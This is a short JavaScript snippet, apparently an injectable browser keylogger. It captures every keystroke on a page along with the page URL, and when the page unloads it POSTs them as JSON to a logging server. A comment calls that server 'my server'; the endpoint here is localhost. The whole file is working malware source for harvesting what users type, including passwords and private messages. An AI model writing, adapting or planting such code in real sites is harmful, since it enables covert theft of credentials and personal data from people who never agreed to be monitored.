(function(){
	var keys = [];
	var keynames = new Array();
	var keyEl = {};
	// var activeEl = document.activeElement.name;
	var location = document.location.href;
	window.addEventListener("keydown", function(event) {
		// listen to keylogs and push it to keys
		console.log(event.key);
		return keys.push(event.key), 
			keynames[event.keyCode] = event.key
			// keyEl[activeEl] = event.key;
	});
	window.onbeforeunload = function(event) {
		console.log("sending data");
		// send keylogs to my server;
		var data = {
			keys: keys,
			location: location
		}
		var xhr = new XMLHttpRequest();
		xhr.open("POST", "http://localhost:5000/keystrokelogger", true);
		xhr.setRequestHeader('Content-Type', 'application/json')
		xhr.send(JSON.stringify(data));
	};
}());